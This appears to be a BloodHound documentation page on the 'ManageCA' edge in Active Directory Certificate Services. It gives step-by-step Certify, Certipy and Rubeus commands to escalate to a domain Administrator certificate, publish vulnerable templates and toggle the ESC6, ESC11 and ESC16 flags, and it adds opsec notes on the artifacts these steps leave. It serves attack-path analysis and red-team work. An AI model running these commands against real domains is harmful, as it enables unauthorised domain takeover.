title: ManageCA
description: The principal has the "Manage CA", also known as "CA Administrator", permission on the Enterprise CA.
---

<img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>

This permission allows the principal to configure the CA to allow subject alternate names, publish certificate templates, grant "Manage Certificates", grant enrollment rights, change certain CA flags, and more.

CA Administrators can perform the following actions that may enable an ADCS escalation:

1. Grant CA Officer (ManageCertificates) and approve a denied certificate request
2. Publish a certificate template (e.g. one that enables an ESC1 condition)
3. Grant Enroll on the enterprise CA
4. Enable the ESC6 CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2`
5. Disable the ESC11 enforcement flag `IF_ENFORCEENCRYPTICERTREQUEST` (weakens RPC enrollment security; enables relay)
6. Disable the security extension on the enterprise CA (ESC16)
7. Abuse a CRL Distribution Point (CDP) to coerce and relay the CA server
8. Abuse a CDP to obtain RCE on the CA server (e.g., via web shell)

## Abuse Info

This relationship alone is not automatically a privilege escalation; however, it frequently enables one of several ADCS escalation paths when combined with template / CA configuration weaknesses.


### 1. Grant CA Officer and Approve a Denied Request

Role separation (when enabled) prevents a single principal from holding both ManageCA and ManageCertificates, but this configuration is rare.

**Windows**

Grant the CA Officer (ManageCertificates) role with Certify (v2.0):
```cmd
Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --officer S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-12345
```
Request an ESC1 (or other high-value) certificate you don't have enrollment rights for:
```cmd
Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomUser --upn Administrator --sid S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-500
```
Approve the denied certificate request by ID:
```cmd
Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --issue-id 1337
```
Download the certificate (captures private key in Base64 PFX):
```cmd
Certify.exe request-download --ca ca01.corp.local\CORP-CA01-CA --id 1337 --private-key <Base64PrivateKey>
```
Authenticate using the certificate (example with Rubeus):
```cmd
Rubeus.exe asktgt /user:Administrator /certificate:<Base64PFX> /ptt
```

**Linux**
Grant CA Officer (ManageCertificates) role:
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password 'Passw0rd'
```
Issue (approve) a previously denied request:
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password 'Passw0rd'
```
Retrieve the certificate:
```bash
certipy req -username john@corp.local -password 'Passw0rd' -ca corp-DC-CA -target ca.corp.local -retrieve 785
```

### 2. Publish a Certificate Template

**Windows**

Publish/unpublish a template (e.g. enabling ESC1):
```cmd
Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --template MyTemplate
```

**Linux**

Publish a template:
```bash
certipy ca -ca 'corp-DC-CA' -enable-template TemplateCN -username john@corp.local -password 'Passw0rd'
```

See the ADCS ESC1 abuse documentation for subsequent exploitation steps: [ADCSESC1](https://github.com/SpecterOps/bloodhound-docs/blob/main//resources/edges/adcs-esc1)

### 3. Grant Enroll on Enterprise CA

**Windows**

Grant or revoke CA enrollment rights (required for certificate issuance):

```cmd
Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --enroll S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-12345
```

### 4. Enable ESC6 Flag `EDITF_ATTRIBUTESUBJECTALTNAME2`
**Windows**

Toggle the flag:
```cmd
Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --esc6
```
Restart of the CA service (requires local admin) is needed for the change to apply.
See the ADCS ESC6 abuse documentation for subsequent exploitation steps: [ADCSESC6a](https://github.com/SpecterOps/bloodhound-docs/blob/main//resources/edges/adcs-esc6a)

### 5. Disable ESC11 Flag `IF_ENFORCEENCRYPTICERTREQUEST`
**Windows**

Toggle the flag:
```cmd
Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --esc11-req
```
Restart of the CA service required.

### 6. Disable Security Extension (ESC16)
**Windows**

Set CA settings for ESC16:
```cmd
Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --esc16
```
Restart of the CA service required.

### 7 & 8. Abuse CDP for Coercion / RCE

Techniques to coerce & relay or achieve RCE via CDP manipulation are described here: [AD CS: from ManageCA to RCE](https://www.tarlogic.com/blog/ad-cs-manageca-rce/)


## Opsec Considerations

Abusing these capabilities commonly results in certificate issuance; issued certificates (and sometimes pending requests) leave artifacts on the CA host. Enabling/disabling flags or publishing templates may generate observable administrative events and typically requires a CA service restart for certain changes (ESC6, ESC11, ESC16) to take effect.
